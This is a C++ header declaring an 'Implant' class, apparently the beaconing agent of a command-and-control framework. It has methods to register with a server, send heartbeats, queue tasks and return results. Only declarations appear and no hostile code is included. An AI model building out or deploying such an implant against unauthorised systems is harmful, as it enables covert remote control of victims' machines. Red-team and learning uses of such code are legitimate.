#pragma once

#include <iostream>
#include <string>
#include <optional>
#include <vector>
#include <random>
#include <nlohmann/json.hpp>

#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <asio.hpp>
#include <queue>

#include "tasks.h"
#include "net_message.h"

using json = nlohmann::json;

class Implant {
private:
    const std::string host, port;
    std::string id;
    bool isRunning;

    asio::io_context context;
    std::queue<Task> taskQueue;

    void handleResponse(std::string& data);
    void parseTasks(const std::string& response);
    void heartbeat(asio::ip::tcp::socket& socket);
	[[nodiscard]] std::string sendResults();

public:
    Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning = false);

    void beacon();
    void registerAgent(asio::ip::tcp::socket& socket);
    void setRunning(bool isRunning);
    void setId(std::string& implantId);
};


